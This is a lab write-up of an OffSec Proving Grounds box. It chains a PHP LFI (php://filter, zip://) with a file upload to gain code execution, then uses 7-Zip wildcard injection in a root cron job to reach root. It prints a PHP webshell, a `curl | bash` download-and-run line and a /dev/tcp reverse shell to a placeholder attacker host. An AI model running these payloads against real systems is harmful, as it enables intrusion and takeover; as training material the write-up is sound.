
## Overview

**Platform:** OffSec Proving Grounds **Operating System:** Linux (Ubuntu 20.04) **Web Application:** Custom PHP upload utility ("Zipper") **Initial Access:** LFI (`php://filter`, `zip://` wrappers) chained with unrestricted file upload → RCE **Initial Access Type:** Web application exploitation **Privilege Escalation:** 7-Zip wildcard injection against a root cron job (`/opt/backup.sh`) **Final Access:** Root

### Key Techniques

- Nmap service enumeration
- Source review via `php://filter` LFI
- LFI parameter analysis (forced `.php` extension)
- File upload + LFI chaining for RCE
- `zip://` PHP wrapper abuse
- Reverse shell via `curl | bash`
- Cron job discovery (`/etc/crontab`)
- pspy64 process monitoring
- LinPEAS automated enumeration
- 7-Zip wildcard injection (`WildCardsGoingWild`)
- Symlink + listfile abuse for arbitrary file read
- SSH password reuse to root

---

# Attack Path

```text
Nmap: 22, 80, 873
        ↓
Web Upload Page + LFI Parameter
        ↓
Confirm .php Extension Forced (source review via php://filter)
        ↓
Upload PHP Webshell as .zip
        ↓
Trigger via zip:// LFI Wrapper
        ↓
Command Execution as www-data
        ↓
Reverse Shell
        ↓
Cron Enumeration (/etc/crontab)
        ↓
Discover Root Cron: /opt/backup.sh
        ↓
Identify 7za *.zip Wildcard in Script
        ↓
Symlink + Listfile Trick (enox.zip / @enox.zip)
        ↓
7-Zip WildCardsGoingWild Error Leaks /root/secret
        ↓
SSH as root using leaked secret
        ↓
Root Shell
```

---

# 1. Nmap Enumeration

```bash
nmap 192.168.120.119 -sC -sV
```

```text
22/tcp   ssh    OpenSSH 8.2p1 Ubuntu
80/tcp   http   Apache 2.4.41 - "Zipper"
873/tcp  rsync
```

> [!tip] Recognition Pattern `rsync` open alongside a web server is worth remembering as a secondary vector to revisit if the web app dead-ends — it wasn't needed here, but anonymous rsync modules are a common misconfiguration on boxes that also run a web service.

---

# 2. Web Application Review

Browsing to port 80 shows a file upload page. Viewing the page source, the "home" link is:

```text
/index.php?file=home
```

The `file` parameter is reflected into an `include()` — a classic LFI candidate. Testing confirmed `.php` is **automatically appended** to whatever is supplied, restricting which files can be included directly.

---

# 3. Confirming LFI with a PHP Wrapper

Rather than fighting the forced `.php` extension, used the `php://filter` wrapper to read `index.php`'s own source as base64 (bypassing execution, since the filter returns encoded file contents instead of running the file):

```text
http://<target>/index.php?file=php://filter/convert.base64-encode/resource=index
```

Decoded source:

```php
<?php
$file = $_GET['file'];
if(isset($file))
{
    include("$file".".php");
}
else
{
    include("home.php");
}
?>
```

This confirms the `.php` suffix is hardcoded in the `include()` call itself — not a filter that can be bypassed with null bytes or path tricks, just a fixed string concatenation.

> [!tip] Key Principle When an LFI forces a specific extension, don't treat it as a hard wall. Reading the actual include logic (via `php://filter`) tells you exactly what you're working around, rather than guessing at bypasses that may not apply to this specific implementation.

---

# 4. Chaining Upload + LFI for RCE

With an upload feature and an LFI that runs `.php` files, the plan: upload a PHP webshell disguised as a `.zip`, then use the `zip://` wrapper to reach inside the zip archive and execute the PHP file it contains — sidestepping the `.php`-suffix restriction entirely, since the wrapper targets an _entry inside_ the zip, not a file on disk.

**Step 1 — Create the payload:**

```php
<?php echo system($_GET['cmd']); ?>
```

Saved as `exploit.php`.

**Step 2 — Upload it** through the web app's upload form. The app stores it inside a zip archive on the server, retrievable at a path like:

```text
http://<target>/uploads/upload_1627661999.zip
```

**Step 3 — Trigger execution via the `zip://` wrapper**, referencing the entry name inside the archive with `#`:

```text
http://<target>/index.php?file=zip://uploads/upload_1627661999.zip%23exploit&cmd=whoami
```

Response: `www-data` — confirmed code execution.

> [!warning] Wrapper Syntax Matters The `#` needs to be URL-encoded as `%23` in the request, and the fragment after it must match the **entry name inside the zip**, not the original filename on disk. Small syntax mismatches here are a common reason this technique appears to fail.

---

# 5. Reverse Shell

**Listener:**

```bash
nc -lvnp 443
```

**Payload file (`shell.sh`), served from a local web server:**

```bash
bash -c 'bash -i >& /dev/tcp/<attacker_ip>/443 0>&1'
```

```bash
python3 -m http.server 80
```

**Trigger via the same `zip://` RCE primitive:**

```text
http://<target>/index.php?file=zip://uploads/upload_1627661999.zip%23exploit&cmd=curl%20<attacker_ip>/shell.sh%20|%20bash
```

Shell received as `www-data`.

```bash
id
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

# 6. Privilege Escalation Enumeration

## Cron discovery

```bash
cat /etc/crontab
```

```text
* * * * *   root    bash /opt/backup.sh
```

A root-owned script running **every minute**.

> [!tip] What I did differently The published walkthrough finds this purely by reading `/etc/crontab`. In practice, running **pspy64** and checking **LinPEAS** output both independently surfaced `/opt/backup.sh` executing on a one-minute cadence — worth doing all three (crontab review, pspy, LinPEAS) since any one of them can be the one that actually catches a scheduled job, especially if it's defined somewhere other than `/etc/crontab` (a user crontab, `/etc/cron.d/`, a systemd timer).

## Reviewing the script

```bash
cat /opt/backup.sh
```

```bash
#!/bin/bash
password=`cat /root/secret`
cd /var/www/html/uploads
rm *.tmp
7za a /opt/backups/backup.zip -p$password -tzip *.zip > /opt/backups/backup.log
```

Breaking down what matters:

- Reads a password from `/root/secret` (root-only file, otherwise unreadable to `www-data`)
- Runs `7za` against `*.zip` in a directory `www-data` can write to (`/var/www/html/uploads`)
- Logs 7-Zip's own output to `/opt/backups/backup.log`

Two separate weaknesses stack here: a wildcard expanded inside a directory we control, and a log file that will contain whatever 7-Zip prints — including error text that can be made to include file contents.

---

# 7. 7-Zip Wildcard Injection (`WildCardsGoingWild`)

7-Zip supports a **listfile** feature: a file named `@<name>` tells 7z to treat `<name>` as a file _containing a list of filenames_ to include, rather than a literal archive member. Combining this with a symlink lets us smuggle an arbitrary file path into the compression job, and 7-Zip's own error handling (`WildCardsGoingWild`) reflects file contents into its log output when things don't resolve the way it expects.

**Step 1 — Create a symlink** pointing at the target file, named so it matches the cron job's `*.zip` glob:

```bash
ln -s /root/secret enox.zip
```

**Step 2 — Create an empty listfile marker**, `@` + the same name, telling 7z to treat `enox.zip` as a listfile rather than an archive:

```bash
touch @enox.zip
```

```text
drwxr-xr-x 2 www-data www-data 4096 .
-rw-r--r-- 1 www-data www-data    0 @enox.zip
lrwxrwxrwx 1 www-data www-data   12 enox.zip -> /root/secret
```

> [!note] What I did differently On my run, `enox.zip` and `@enox.zip` were **already present** in the uploads directory — seemingly left over from a previous session or pre-staged by the box itself. I didn't need to create them manually; I just noticed `@enox.zip`'s symlink target was `/root/secret` and confirmed the technique was already primed to fire on the next cron execution.

**Step 3 — Wait for the cron job**, then read the result.

The published approach reads the leaked secret from the log file directly:

```bash
cat /opt/backups/backup.log
```

```text
Scan WARNINGS for files and folders:
WildCardsGoingWild : No more files
----------------
Scan WARNINGS: 1
/root/secret : WildCardsGoingWild
```

> [!note] What I did differently Rather than reading `backup.log` after the fact, **pspy64's live output already showed the full command line and stdout of the `7za` process each time the cron job fired** — including the leaked `/root/secret` value directly in the pspy stream, without needing to separately `cat` the log file. This is a good reminder that pspy doesn't just tell you _that_ a process ran — it can capture output that a script only otherwise writes to a log file you might not think to check.

---

# 8. Root Access

The leaked secret is root's SSH password.

```bash
ssh root@<target>
# password: <leaked secret>
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|`file=` parameter included via `include()`|LFI candidate|
|Forced file extension on an LFI|Read the include logic via `php://filter` rather than guessing bypasses|
|Upload feature + LFI both present|Chain them — upload payload, trigger via `zip://` or `phar://` wrapper|
|`zip://archive#entry` request|Ensure `#` is URL-encoded as `%23`, entry name matches the file inside the zip|
|Root cron job found|Check crontab, pspy, and LinPEAS — don't rely on just one|
|Script uses `*` glob in an attacker-writable directory|Check for wildcard injection (7z, tar, chown, rsync all have known techniques)|
|Script logs command output somewhere|Check whether the log can leak more than intended (error messages, verbose output)|
|pspy shows a process's live stdout|Read it directly — may save a step versus hunting for a log file|

---

# Key Lessons

> [!tip] LFI With a Forced Extension Isn't a Dead End Use a wrapper like `php://filter` to read the actual inclusion logic rather than assuming the extension restriction can't be worked around. Understanding the real constraint often reveals the actual bypass (here, `zip://` sidestepping the suffix check entirely by targeting an in-archive entry).

> [!tip] Upload + LFI Is a Classic RCE Combo Any time both an upload feature and an LFI exist on the same app, assume they're meant to be chained. The `zip://` and `phar://` wrappers are the standard tools for turning an uploaded archive into executed code via LFI.

> [!tip] Wildcard Injection Isn't Just a `tar` Trick `7za`/`7z`, `tar`, `rsync`, `chown -R`, and several other tools that accept a glob in an attacker-writable directory have their own documented wildcard-abuse techniques. Whenever a root-run script does `<tool> ... *` in a directory you can write to, check whether that specific tool has a known wildcard trick — not just tar's.

> [!tip] Check Multiple Enumeration Tools for Cron/Scheduled Jobs `/etc/crontab`, pspy, and LinPEAS each can catch things the others miss — user crontabs, `cron.d` entries, and systemd timers aren't all guaranteed to show up in every method. Running more than one costs little.

> [!tip] pspy Output Can Include More Than Just "This Ran" Live process output captured by pspy sometimes contains the exact same information you'd otherwise have to dig out of a log file — worth reading the full pspy stream rather than just using it to confirm a process's existence and cadence.